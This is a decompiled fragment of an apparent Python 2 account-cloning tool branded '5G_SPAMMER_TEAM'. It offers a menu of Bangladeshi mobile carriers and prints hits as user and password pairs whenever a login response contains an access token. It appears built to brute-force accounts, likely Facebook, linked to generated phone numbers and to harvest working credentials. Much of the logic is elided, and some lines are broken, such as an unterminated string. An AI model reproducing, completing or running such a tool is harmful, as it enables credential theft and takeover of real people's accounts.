...
# Embedded file name: /storage/emulated/0/5g7days.py
...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO 5G_SPAMMER_TEAM -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : TEAM 5G_ST'
    print '\x1b[1;91mFACEBOOK  : 5G_SPAMMER_TEAM'
    print '\x1b[1;91mGITHUB  : github.com/5gspmmingteam'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI (5G)'
    print '\x1b[1;92m[2]  AIRTEL(5G)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN PHONE(5G)'
    print '\x1b[1;92m[6]  TELETALK(5G)
...
def action():
    ...
    print ''
    print 50 * '-'
    psb('[\xe2\x9c\x93] Total Numbers: ' + 1000)
    time.sleep(0.5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[5G-CHECKPOINT]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
    ...
    os.system('python2 5g7days.py')


if __name__ == '__main__':
    menu()
# okay decompiling 5g7days.pyc
